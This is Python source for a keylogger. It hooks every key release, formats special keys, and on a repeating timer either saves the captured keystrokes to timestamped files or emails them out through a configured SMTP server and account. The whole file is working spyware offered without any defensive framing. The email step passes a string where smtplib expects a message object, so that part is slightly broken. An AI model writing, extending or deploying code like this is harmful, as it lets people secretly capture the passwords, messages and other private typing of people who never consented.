import keyboard as kb
import smtplib
from threading import Timer
from datetime import datetime as dt
from email.mime.multipart import MIMEMultipart as email_constructor
from email.mime.text import MIMEText as email_text
from utils import *


class Keylogger:
    def __init__(self):
        self.properties = get_config_data(".config")

        self.start_time, self.end_time = dt.now(), dt.now()
        self.filename = ""
        self.log = ""

    def callback(self, event):
        pressed_key: str = event.name

        """
        if the key is a special key, name will be longer than 1,
        otherwise it will be a single character added to the log without any formats
        """
        if len(pressed_key) > 1:
            if pressed_key == "space":
                pressed_key = " "
            elif pressed_key == "enter":
                pressed_key = "[ENTER]\n"
            elif pressed_key == "decimal":
                pressed_key = "."
            else:
                pressed_key = pressed_key.replace(" ", "_")
                pressed_key = f"[{pressed_key.upper()}]"

        self.log += pressed_key

    def update_filename(self):
        start_dt_str = (
            str(self.start_time)[:-7]
            .replace(" ", "__")
            .replace("-", ".")
            .replace(":", "-")
        )
        end_dt_str = (
            str(self.end_time)[:-7]
            .replace(" ", "__")
            .replace("-", ".")
            .replace(":", "-")
        )
        self.filename = f"keylog_{start_dt_str}---{end_dt_str}"

    def report(self):
        method_no = None
        match self.properties["report_method"]:
            case "email":
                method_no = 0

            case "file":
                method_no = 1

            case _:
                raise ValueError("Invalid report method")

        if self.log:
            self.end_time = dt.now()
            self.update_filename()
            if method_no:
                self.write_to_file()
            else:
                self.send_email(
                    self.properties["email_address"], self.properties["email_password"]
                )

            self.start_time = dt.now()
            self.log = ""

        timer = Timer(
            interval=self.properties["send_report_every"], function=self.report
        )
        timer.daemon = True
        timer.start()

    def prepare_email(self, message: str):
        email = email_constructor("alternative")
        email["From"] = self.properties["email_address"]
        email["To"] = self.properties["email_address"]

        email["Subject"] = f"Keylogger report from {self.start_time} to {self.end_time}"

        email.attach(email_text(message, "plain"))

        return email.as_string()

    def send_email(self, email_address: str, email_password: str):
        server = smtplib.SMTP(
            self.properties["email_server_address"],
            self.properties["email_server_port"],
        )

        server.starttls()
        server.login(email_address, email_password)
        server.send_message(self.prepare_email(self.log))
        server.quit()

    def write_to_file(self):
        with open(f"{self.filename}.txt", "w", encoding="UTF-8") as file:
            file.write(self.log)
            file.close()

    def start(self):
        self.start_time = dt.now()

        kb.on_release(callback=self.callback)

        self.report()

        kb.wait()


if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()
